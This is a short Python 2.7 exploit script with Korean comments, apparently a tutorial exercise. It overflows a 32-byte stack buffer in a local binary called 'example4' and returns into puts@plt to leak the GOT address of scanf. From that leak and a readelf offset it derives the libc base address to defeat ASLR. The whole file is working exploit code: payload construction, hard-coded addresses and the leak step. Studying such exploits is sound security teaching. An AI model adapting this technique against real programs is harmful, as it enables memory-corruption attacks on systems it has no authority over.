#!/usr/bin/python2.7
'''
example4_leak.py
32바이트의 버퍼를 이용하여 버퍼오버플로우 기법을 사용함. 
32바이트 = A
4바이트 = EIP
4바이트 = puts함수의 plt값 (plt주소는 고정임)

구한 scanf의 주소와 libc 베이스 주소로부터 scanf 함수 주소까지의 오프셋을 이용해 libc의 베이스 주소를 구할 수 있습니다.

libc 베이스 주소 = scanf의 GOT 주소 - libc 베이스 주소로부터 scanf의 GOT 주소까지의 오프셋
readelf를 이용해 libc.so.6 파일에서 scanf 함수의 오프셋을 구할 수 있습니다.

$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep scanf
   424: 0005c0c0   258 FUNC    GLOBAL DEFAULT   13 __isoc99_scanf@@GLIBC_2.7
   
libc 베이스 주소 = scanf 주소 - 0x5c0c0


'''
import struct
import subprocess
import os
import pty
def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise
def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
  except:
    raise
def p32(val):
  return struct.pack("<I", val)
def u32(data):
  return struct.unpack("<I", data)[0]
out_r, out_w = pty.openpty()
s = subprocess.Popen("./example4", stdin=subprocess.PIPE, stdout=out_w)
print `readline(out_r)`     # Hello World!\n
print `readline(out_r)`     # Hello ASLR!\n
payload  = "A"*36           # buf padding
payload += p32(0x8048326)   # ret addr (puts@plt + 6)
payload += p32(0xdeadbeef)  # ret after puts
payload += p32(0x804a014)   # scanf@got
writeline(s, payload)
out = readline(out_r)     # memory leakage of scanf@got
print `out`
scanf_addr = u32(out[:4])
print "scanf @ " + hex(scanf_addr)
